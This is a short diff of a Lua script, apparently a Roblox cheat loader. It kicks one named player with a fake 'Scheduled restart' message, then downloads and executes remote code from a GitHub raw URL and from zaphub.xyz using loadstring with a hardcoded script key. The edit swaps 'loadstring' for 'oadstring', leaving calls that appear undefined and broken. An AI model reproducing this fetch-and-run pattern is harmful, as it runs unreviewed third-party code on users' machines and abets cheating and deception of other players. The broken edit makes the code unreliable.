@@ -9,11 +9,11 @@ if player.Name == "AkFrosty_YT" then
         player:Kick("Scheduled restart")
     end)
 
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/Monster69696/PS99/main/Backroom/Script"))()
+    oadstring(game:HttpGet("https://raw.githubusercontent.com/Monster69696/PS99/main/Backroom/Script"))()
 
 else
 
     script_key = "wUyvmjsmuvRIwOPwLszkupgIOvvIkoYq"
-    loadstring(game:HttpGet("https://zaphub.xyz/Exec"))()
+    oadstring(game:HttpGet("https://zaphub.xyz/Exec"))()
 
 end
